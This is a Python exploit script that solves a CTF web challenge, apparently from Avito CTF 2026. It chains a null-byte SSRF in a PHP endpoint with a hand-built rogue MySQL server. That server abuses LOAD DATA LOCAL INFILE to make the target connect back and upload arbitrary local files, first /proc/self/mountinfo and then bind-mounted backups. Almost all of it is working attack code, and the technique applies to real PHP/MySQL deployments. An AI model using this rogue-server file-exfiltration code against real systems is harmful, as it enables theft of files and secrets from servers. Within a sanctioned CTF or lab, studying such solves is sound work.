#!/usr/bin/env python3
"""Medofans (Avito CTF 2026) -- SSRF -> rogue-MySQL -> LOAD DATA LOCAL INFILE -> flag.

How the solution was reached (same logic as the write-up, condensed):

  * ``/api/content.php?lang=<L>`` builds a DB host ``<L>.db.internal`` by string
    concatenation. PHP strings are binary-safe but the underlying C
    ``getaddrinfo`` stops at the first NUL byte, so ``lang=<HOST>%00`` makes the
    app resolve+connect to ``<HOST>:3306`` (the ``.db.internal`` suffix survives
    only in the error text). Proof: ``127.0.0.1%00`` -> "Connection refused",
    ``8.8.8.8%00`` -> "Connection timed out" (NOT "getaddrinfo failed"). Full
    SSRF to any ``host:3306`` (port fixed: a ``:`` in lang triggers an unrelated
    colon-split that drops the port).
  * We stand up a rogue MySQL: complete the handshake advertising
    ``CLIENT_LOCAL_FILES`` and answer the first ``COM_QUERY`` with a LOCAL INFILE
    request (``0xFB`` + path). A mysqli client with ``local_infile`` on uploads
    that local file of the WEB container to us (read as www-data).
  * The flag is NOT in the webroot/env (``/proc/self/environ`` is root-only:
    the worker dropped root->www-data so dumpable=0). It sits in a Docker
    bind-mounted backup at a non-guessable path. We discover the path by reading
    ``/proc/self/mountinfo`` (world-readable, not dumpable-gated), which lists
    every bind-mount incl. single files, then read the mount
    (``/opt/backups/hbf_de_backup_2019-05-05.sql`` -- a mysqldump whose German
    fact #5 body carries the un-redacted flag).

DELIVERY REQUIREMENT: the app dials OUT to ``<CONNECT_BACK>:3306``, so
``CONNECT_BACK`` must be a host/IP publicly reachable by the challenge on
TCP/3306 with this rogue listening. Run from a VPS with a public IP and 3306
open (free tunnels don't give a fixed :3306: bore.pub's 3306 was taken, serveo
refuses anonymous raw-TCP forwards).

Dependencies: stdlib + ``requests``. The MySQL wire framing is hand-rolled.

Usage:
    uv run python medofans/solve_medofans.py \\
        --target https://hbfuns-9vqogw6q.avitoctf.ru \\
        --connect-back <YOUR_PUBLIC_IP>
"""

from __future__ import annotations

import argparse
import re
import socket
import struct
import threading
from dataclasses import dataclass, field

import requests

# Mount points that are standard container plumbing, never the flag.
_BORING_MOUNTS = frozenset({"/", "/etc/hosts", "/etc/hostname", "/etc/resolv.conf"})
_BORING_PREFIXES = ("/proc", "/sys", "/dev")

# Greeting capability flags. CLIENT_LOCAL_FILES must be advertised so the client
# honours our LOCAL INFILE request; the client still needs its own local_infile.
_CAP_LOW = 0xF7FF
_CAP_HIGH = 0xF781

_OK = b"\x00\x00\x00\x02\x00\x00\x00"  # OK: affected=0, insert_id=0, status=2, warn=0
_FLAG_RE = re.compile(rb"avito\{[^}]*\}")


@dataclass
class Capture:
    """Shared state: the path currently requested and the bytes read back."""

    target_path: str = "/proc/self/mountinfo"
    data: bytes = b""
    got_file: bool = False
    event: threading.Event = field(default_factory=threading.Event)


def _packet(payload: bytes, seq: int) -> bytes:
    """Frame a MySQL payload with its 3-byte length + 1-byte sequence header."""
    return struct.pack("<I", len(payload))[:3] + bytes([seq & 0xFF]) + payload


def _recv_exact(sock: socket.socket, n: int) -> bytes:
    """Receive exactly ``n`` bytes (or fewer if the peer closes early)."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            break
        buf += chunk
    return buf


def _read_packet(sock: socket.socket) -> tuple[bytes, int]:
    """Read one full MySQL packet; return (payload, sequence_id)."""
    header = _recv_exact(sock, 4)
    if len(header) < 4:
        return b"", -1
    length = header[0] | (header[1] << 8) | (header[2] << 16)
    return _recv_exact(sock, length), header[3]


def _greeting() -> bytes:
    """Build a protocol-10 server greeting advertising CLIENT_LOCAL_FILES."""
    salt1 = b"\x11\x22\x33\x44\x55\x66\x77\x88"
    salt2 = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c"
    payload = b"".join(
        (
            b"\x0a5.7.40-rogue\x00",  # protocol 10 + version, null-terminated
            struct.pack("<I", 0x36),  # thread id
            salt1,
            b"\x00",  # filler
            struct.pack("<H", _CAP_LOW),
            b"\x21",  # charset utf8_general_ci
            struct.pack("<H", 0x0002),  # status flags
            struct.pack("<H", _CAP_HIGH),
            b"\x15",  # auth-plugin-data length = 21
            b"\x00" * 10,  # reserved
            salt2,
            b"\x00",
            b"mysql_native_password\x00",
        )
    )
    return _packet(payload, 0)


def _handle_connection(conn: socket.socket, cap: Capture) -> None:
    """Drive one client through handshake and a LOCAL INFILE file read."""
    try:
        conn.settimeout(15)
        conn.sendall(_greeting())
        _read_packet(conn)  # client login/auth -- ignored, we accept everyone
        conn.sendall(_packet(_OK, 2))

        # The app now issues its content query. Answer the first COM_QUERY with a
        # LOCAL INFILE request for our target file.
        payload, _ = _read_packet(conn)
        if not payload or payload[0] != 0x03:  # 0x03 = COM_QUERY
            return
        conn.sendall(_packet(b"\xfb" + cap.target_path.encode(), 1))

        # Client streams the file back in packets, ending with an empty packet.
        blob = b""
        while True:
            data, seq = _read_packet(conn)
            if seq == -1 or data == b"":
                break
            blob += data
        cap.data = blob
        cap.got_file = bool(blob)
        conn.sendall(_packet(_OK, 3))  # finish the statement cleanly
    except OSError:
        pass
    finally:
        cap.event.set()
        try:
            conn.close()
        except OSError:
            pass


def _serve(listener: socket.socket, cap: Capture, stop: threading.Event) -> None:
    """Accept loop: each inbound connection serves the current target path."""
    while not stop.is_set():
        try:
            conn, _addr = listener.accept()
        except OSError:
            break
        _handle_connection(conn, cap)


def _trigger(target: str, connect_back: str, timeout: float = 15.0) -> None:
    """Fire the null-byte SSRF so the app dials our rogue server.

    Args:
        target: Base URL of the challenge (trailing slash optional).
        connect_back: Host/IP the app should connect to (our rogue server).
        timeout: Per-request timeout in seconds.
    """
    url = f"{target.rstrip('/')}/api/content.php"
    # lang = "<host>\x00" -> host resolves via truncated getaddrinfo, port 3306.
    try:
        requests.get(url, params={"lang": f"{connect_back}\x00"}, timeout=timeout)
    except requests.RequestException:
        pass


def read_file(target: str, connect_back: str, cap: Capture, path: str) -> bytes:
    """Read one absolute path off the web container via LOAD DATA LOCAL INFILE.

    Args:
        target: Challenge base URL.
        connect_back: Public host/IP the app connects back to (our rogue).
        cap: Shared capture state (the serve thread reads ``cap.target_path``).
        path: Absolute path to fetch.

    Returns:
        The file bytes (empty if missing / unreadable by www-data / empty file).
    """
    cap.target_path = path
    cap.data = b""
    cap.got_file = False
    cap.event.clear()
    _trigger(target, connect_back)
    cap.event.wait(timeout=14)
    return cap.data


def parse_bind_mounts(mountinfo: bytes) -> list[str]:
    """Extract interesting bind-mount targets (single files) from mountinfo.

    Args:
        mountinfo: Raw bytes of ``/proc/self/mountinfo``.

    Returns:
        Mount points that are not standard container plumbing -- e.g. a
        ``-v ./flag:/opt/backups/x.sql`` single-file bind-mount.
    """
    out: list[str] = []
    for line in mountinfo.decode("utf-8", "replace").splitlines():
        fields = line.split(" ")
        # A real mountinfo record starts with "<mount_id> <parent_id> ..." and has
        # a " - " separator; this guard skips any non-mountinfo noise.
        if (
            len(fields) < 5
            or not (fields[0].isdigit() and fields[1].isdigit())
            or "-" not in fields
        ):
            continue
        mount_point = fields[4]
        if mount_point in _BORING_MOUNTS:
            continue
        if any(mount_point == p or mount_point.startswith(p + "/") for p in _BORING_PREFIXES):
            continue
        out.append(mount_point)
    return out


def solve(target: str, connect_back: str, bind_port: int = 3306) -> str | None:
    """Run the full chain: rogue up -> mountinfo -> read bind-mounts -> flag.

    Args:
        target: Challenge base URL.
        connect_back: Public host/IP the challenge reaches on TCP/3306 (us).
        bind_port: Local port to listen on (must be 3306 to match the app).

    Returns:
        The flag string, or None if not found.
    """
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("0.0.0.0", bind_port))
    listener.listen(8)
    listener.settimeout(1.0)

    cap = Capture()
    stop = threading.Event()
    server = threading.Thread(target=_serve, args=(listener, cap, stop), daemon=True)
    server.start()

    try:
        print("[*] reading /proc/self/mountinfo to discover bind-mounts ...", flush=True)
        mountinfo = read_file(target, connect_back, cap, "/proc/self/mountinfo")
        if not mountinfo:
            print("[-] mountinfo empty -- is the rogue reachable on :3306?", flush=True)
            return None
        candidates = parse_bind_mounts(mountinfo)
        print(f"[+] bind-mount candidates: {candidates}", flush=True)

        for path in candidates:
            print(f"[*] reading {path} ...", flush=True)
            blob = read_file(target, connect_back, cap, path)
            match = _FLAG_RE.search(blob)
            if match:
                flag = match.group().decode()
                print(f"[!!] FLAG: {flag}", flush=True)
                return flag
            preview = blob[:120].decode("utf-8", "replace").replace("\n", " ")
            print(f"    ({len(blob)} bytes) {preview}", flush=True)
    finally:
        stop.set()
        listener.close()
    return None


def main() -> None:
    """Parse args and run the solve."""
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="https://hbfuns-9vqogw6q.avitoctf.ru")
    parser.add_argument(
        "--connect-back",
        required=True,
        help="Public host/IP the challenge can reach on TCP/3306 (this rogue server).",
    )
    parser.add_argument("--port", type=int, default=3306, help="Local listen port (keep 3306).")
    args = parser.parse_args()

    flag = solve(args.target, args.connect_back, bind_port=args.port)
    if flag:
        print(f"\n=== FLAG: {flag} ===")
    else:
        print("\n[!] flag not found; inspect the bind-mount candidates above.")


if __name__ == "__main__":
    main()
